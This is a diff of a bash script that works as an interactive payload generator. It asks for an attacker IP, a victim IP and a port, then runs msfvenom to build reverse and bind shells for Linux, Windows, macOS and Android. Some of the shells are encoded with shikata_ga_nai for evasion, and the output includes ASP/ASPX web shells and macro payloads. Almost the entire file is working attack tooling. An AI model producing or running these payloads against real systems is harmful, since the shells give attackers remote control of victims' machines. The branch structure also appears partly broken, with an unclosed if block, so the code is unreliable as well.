@@ -11,10 +11,23 @@ echo -e
 . ./ascii.sh
 echo -e "\n"
 echo -e "${RED}Available platforms:${XX}"
-echo -e "[1] Linux"
-echo -e "[2] MacOS"
-echo -e "[3] Andriod"
-echo -e "[4] Windows"
+echo -e "\n${BLUE}╔═════{ 1. Linux:${XX}"
+    echo -e "	══{ Simple_Shell         ══{ Bash Scripting"
+    echo -e "	══{ Socat                ══{ Perl"
+    echo -e "	══{ Python               ══{ PHP"
+    echo -e "	══{ Ruby                 ══{ Netcat"
+    echo -e "	══{ Netcat OpenBsd       ══{ AWK"
+    echo -e "	══{ Golang               ══{ Meterpreter Web"
+    echo -e "	══{ Lua                  ══{ Telnet"
+    echo -e "	══{ Binaries Shell"
+echo -e "\n${BLUE}╔═════{ 2. Windows:${XX}"
+    echo -e "	══{ Powershell           ══{ Meterpreter"
+    echo -e "	══{ Creat user account   ══{ http"
+    echo -e "	══{ macros               ══{ ASP/ASPX"
+echo -e "\n${BLUE}╔═════{ 3. MacOS:${XX}"
+    echo -e "	══{ Rev Shell           ══{ Bind Shell"
+echo -e "\n${BLUE}╔═════{ 4. Andriod:${XX}"
+    echo -e "	══{ meterpreter Shell"
 echo -e "\n"
 read -p "[+] Select a platform? [1/2/3/4] " input
 echo -e "\n"
@@ -30,27 +43,29 @@ if [[ $input == "1" ]]; then ## Linux
     echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
     echo -e "${RED} \t\t ═════════════════════════════════════════════[ Linux Payload ]══════════════════════════════════════════ ${XX}"
     echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
-    read -p "Attacker IP Address: " IP
-    read -p "Victim IP Address: " VI
-    read -p "Listener Port: " PO
-    read -p "shikata iterations: " SH
-    echo -e "Platforms:"
-    echo -e "[1] Simple_Shell"
-    echo -e "[2] Bash Scripting"
-    echo -e "[3] Socat"
-    echo -e "[4] Perl"
-    echo -e "[5] Python"
-    echo -e "[6] PHP"
-    echo -e "[7] Ruby"
-    echo -e "[8] Netcat"
-    echo -e "[9] Netcat OpenBsd"
-    echo -e "[10] AWK"
-    echo -e "[11] Golang"
-    echo -e "[12] Meterpreter Web"
-    echo -e "[13] Lua"
-    echo -e "[14] Telnet"
-    echo -e "[15] Binaries Shell"
-    read -p "[+] For which Platform? " plat
+    echo -e "\n${BLUE}╔═════{ Enter the following details :${XX}"    
+        read -p "Attacker IP Address: " IP
+        read -p "Victim IP Address: " VI
+        read -p "Listener Port: " PO
+        read -p "shikata iterations: " SH
+    echo -e "\n${BLUE}╔═════{ Platforms :${XX}"
+        echo -e "══{1. Simple_Shell"
+        echo -e "══{2. Bash Scripting"
+        echo -e "══{3. Socat"
+        echo -e "══{4. Perl"
+        echo -e "══{5. Python"
+        echo -e "══{6. PHP"
+        echo -e "══{7. Ruby"
+        echo -e "══{8. Netcat"
+        echo -e "══{9. Netcat OpenBsd"
+        echo -e "══{10. AWK"
+        echo -e "══{11. Golang"
+        echo -e "══{12. Meterpreter Web"
+        echo -e "══{13. Lua"
+        echo -e "══{14. Telnet"
+        echo -e "══{15. Binaries Shell"
+    echo -e "\n"
+    read -p " ═════{ Which Platforms :" plat
     if [[ $plat == "1" ]]; then
         echo -e "\n${BLUE}[+] Simple_Shell:${XX}"
         mkdir Payload_List/Simple_Shell 2>/dev/null
@@ -202,11 +217,9 @@ if [[ $input == "1" ]]; then ## Linux
         mkdir Payload_List/Web_Shells 2>/dev/null
             echo -e "[*] The following reverse shell will run with meterpreter or netcat, make sure you set the payload and other options on your meterpreter:" > Payload_List/Web_Shells/Read_Me.txt
             echo -e "\n- set payload java/jsp_shell_reverse_tcp for JSP_Rev_TCP.jsp" >> Payload_List/Web_Shells/Read_Me.txt
-            echo -e "\n- set payload windows/meterpreter/reverse_tcp for Rev_TCP.asp" >> Payload_List/Web_Shells/Read_Me.txt
             echo -e "\n- set payload java/jsp_shell_reverse_tcp for JSP_Rev_TCP.war" >> Payload_List/Web_Shells/Read_Me.txt
             echo -e "\n- set payload nodejs/shell_reverse_tcp for NodeJS_Rev_TCP.war" >> Payload_List/Web_Shells/Read_Me.txt
             msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PO -f raw > Payload_List/Web_Shells/JSP_Rev_TCP.jsp
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/Web_Shells/Rev_TCP.asp
             msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PO -f war > Payload_List/Web_Shells/JSP_Rev_TCP.war
             msfvenom -p nodejs/shell_reverse_tcp LHOST=$IP LPORT=$PO > Payload_List/Web_Shells/NodeJS_Rev_TCP.war
         ### shikata_ga_nai Payloads
@@ -293,58 +306,23 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x64/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_Bind_TCP-shikata.elf
         echo -e "\n${RED}DONE, look into Payload_List/Binary${XX}"
     fi
-elif [[ $input == "2" ]]; then ## MacOS
-    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
-    echo -e "${RED} \t\t ═════════════════════════════════════════════[ MacOS Payload ]══════════════════════════════════════════ ${XX}"
-    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
-    read -p "Attacker IP Address: " IP
-    read -p "Victim IP Address: " VI
-    read -p "Listener Port: " PO
-    read -p "shikata iterations: " SH
-    echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
-    mkdir Payload_List/Mac 2>/dev/null
-        echo -e "[*] The following reverse shell will run with meterpreter or netcat, make sure you set the payload and other options on your meterpreter:" > Payload_List/Mac/Read_Me.txt
-        echo -e "\n- set payload osx/x86/shell_reverse_tcp for Rev_TCP.macho" >> Payload_List/Mac/Read_Me.txt
-        echo -e "\n- set payload osx/x86/shell_bind_tcp for Bind_TCP.macho" >> Payload_List/Mac/Read_Me.txt
-        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f macho > Payload_List/Mac/Rev_TCP.macho
-        msfvenom -p osx/x86/shell_bind_tcp RHOST=$VI LPORT=$PO -f macho > Payload_List/Mac/Bind_TCP.macho
-    ### shikata_ga_nai Payloads
-        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f macho -e x86/shikata_ga_nai -i $SH > Payload_List/Mac/Rev_TCP_shikata.macho
-        msfvenom -p osx/x86/shell_bind_tcp RHOST=$VI LPORT=$PO -f macho -e x86/shikata_ga_nai -i $SH > Payload_List/Mac/Bind_TCP_shikata.macho
-        echo -e "\n${RED}DONE, look into Payload_List/Mac${XX}"
-elif [[ $input == "3" ]]; then ## Andriod
-    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
-    echo -e "${RED} \t\t ════════════════════════════════════════════[ Andriod Payload ]═════════════════════════════════════════ ${XX}"
-    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
-    read -p "Attacker IP Address: " IP
-    read -p "Victim IP Address: " VI
-    read -p "Listener Port: " PO
-    echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
-    mkdir Payload_List/Andriod 2>/dev/null
-        echo -e "[*] The following reverse shell will run with meterpreter, make sure you set the payload and other options on your meterpreter:" > Payload_List/Andriod/Read_Me.txt
-        echo -e "\n- set payload android/meterpreter/reverse_tcp for Rev_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
-        echo -e "\n- set payload/android/shell/reverse_tcp for Rev_Shell_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
-        echo -e "\n- set android/meterpreter/reverse_tcp for dalvik.apk" >> Payload_List/Andriod/Read_Me.txt
-        msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO R > Payload_List/Andriod/Rev_TCP.apk
-        msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO R -o Payload_List/Andriod/dalvik.apk
-        msfvenom -p payload/android/shell/reverse_tcp LHOST=$IP LPORT=$PO R > Payload_List/Andriod/Rev_Shell_TCP.apk
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║https://www.infosecmatter.com/metasploit-module-library/?mm=payload/android/shell/reverse_http                      ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-    echo -e "\n${RED}DONE, look into Payload_List/Andriod${XX}"
-elif [[ $input == "4" ]]; then ## Windows
+
+elif [[ $input == "2" ]]; then ## Windows
     echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
     echo -e "${RED} \t\t ════════════════════════════════════════════[ Windows Payload ]═════════════════════════════════════════ ${XX}"
     echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
-    read -p "Attacker IP Address: " IP
-    read -p "Victim IP Address: " VI
-    read -p "Listener Port: " PO
-    read -p "shikata iterations: " SH    
-    echo -e "[1] Powershell"
-    echo -e "[2] Meterpreter"
-    echo -e "[3] Creat user acount"
-    echo -e "[4] http"
-    echo -e "[5] macros"
+    echo -e "\n${BLUE}╔═════{ Enter the following details :${XX}"
+        read -p "Attacker IP Address: " IP
+        read -p "Victim IP Address: " VI
+        read -p "Listener Port: " PO
+        read -p "shikata iterations: " SH
+    echo -e "\n${BLUE}╔═════{ Type of Shell:${XX}"   
+        echo -e "══{1. Powershell"
+        echo -e "══{2. Meterpreter"
+        echo -e "══{3. Creat user acount"
+        echo -e "══{4. http"
+        echo -e "══{5. macros"
+        echo -e "══{6. ASP/ASPX"
     read -p "[+] Type?  " ty
     if [[ $ty == "1" ]]; then
         echo -e "\n${BLUE}[+] Powershell:${XX}"
@@ -427,5 +405,63 @@ elif [[ $input == "4" ]]; then ## Windows
             msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/macros/shell_macros.txt
             msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f vba-exe > Payload_List/macros/shell_rev_macros.txt          
         echo -e "\n${RED}DONE, look into Payload_List/macros${XX}"
+    elif [[ $ty == "6" ]]; then
+        echo -e "\n${BLUE}[+] Creating ASP/ASPX Payload:${XX}"
+        mkdir Payload_List/ASP_ASPX 2>/dev/null
+            echo -e "[*] The following binaries run with meterpreter, make sure you set the payload and other options on your meterpreter:" > Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n- set payload windows/meterpreter/reverse_tcp for Rev_TCP.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n- set payload windows/meterpreter/reverse_tcp for Rev_TCP.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n[*] The following Reverse Shell will run with netcat listener on the attacker pc or you may use meterpreter with it, just set the payload and other options:" > Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
+            echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/Rev_TCP.asp
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/Rev_TCP.aspx
+            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/shell_rev.asp
+            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/shell_rev.aspx
+        ### shikata_ga_nai Payloads
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/Rev_TCP_shikata.asp
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/Rev_TCP_shikata.aspx
+            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/shell_rev_shikata.asp
+            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/shell_rev_shikata.aspx
+        echo -e "\n${RED}DONE, look into Payload_List/ASP_ASPX${XX}"
+elif [[ $input == "3" ]]; then ## MacOS
+    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
+    echo -e "${RED} \t\t ═════════════════════════════════════════════[ MacOS Payload ]══════════════════════════════════════════ ${XX}"
+    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
+    read -p "Attacker IP Address: " IP
+    read -p "Victim IP Address: " VI
+    read -p "Listener Port: " PO
+    read -p "shikata iterations: " SH
+    echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
+    mkdir Payload_List/Mac 2>/dev/null
+        echo -e "[*] The following reverse shell will run with meterpreter or netcat, make sure you set the payload and other options on your meterpreter:" > Payload_List/Mac/Read_Me.txt
+        echo -e "\n- set payload osx/x86/shell_reverse_tcp for Rev_TCP.macho" >> Payload_List/Mac/Read_Me.txt
+        echo -e "\n- set payload osx/x86/shell_bind_tcp for Bind_TCP.macho" >> Payload_List/Mac/Read_Me.txt
+        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f macho > Payload_List/Mac/Rev_TCP.macho
+        msfvenom -p osx/x86/shell_bind_tcp RHOST=$VI LPORT=$PO -f macho > Payload_List/Mac/Bind_TCP.macho
+    ### shikata_ga_nai Payloads
+        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f macho -e x86/shikata_ga_nai -i $SH > Payload_List/Mac/Rev_TCP_shikata.macho
+        msfvenom -p osx/x86/shell_bind_tcp RHOST=$VI LPORT=$PO -f macho -e x86/shikata_ga_nai -i $SH > Payload_List/Mac/Bind_TCP_shikata.macho
+        echo -e "\n${RED}DONE, look into Payload_List/Mac${XX}"
+elif [[ $input == "4" ]]; then ## Andriod
+    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
+    echo -e "${RED} \t\t ════════════════════════════════════════════[ Andriod Payload ]═════════════════════════════════════════ ${XX}"
+    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
+    read -p "Attacker IP Address: " IP
+    read -p "Victim IP Address: " VI
+    read -p "Listener Port: " PO
+    echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
+    mkdir Payload_List/Andriod 2>/dev/null
+        echo -e "[*] The following reverse shell will run with meterpreter, make sure you set the payload and other options on your meterpreter:" > Payload_List/Andriod/Read_Me.txt
+        echo -e "\n- set payload android/meterpreter/reverse_tcp for Rev_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
+        echo -e "\n- set payload/android/shell/reverse_tcp for Rev_Shell_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
+        echo -e "\n- set android/meterpreter/reverse_tcp for dalvik.apk" >> Payload_List/Andriod/Read_Me.txt
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO R > Payload_List/Andriod/Rev_TCP.apk
+        msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO R -o Payload_List/Andriod/dalvik.apk
+        msfvenom -p payload/android/shell/reverse_tcp LHOST=$IP LPORT=$PO R > Payload_List/Andriod/Rev_Shell_TCP.apk
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║https://www.infosecmatter.com/metasploit-module-library/?mm=payload/android/shell/reverse_http                      ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+    echo -e "\n${RED}DONE, look into Payload_List/Andriod${XX}"
     fi
 fi
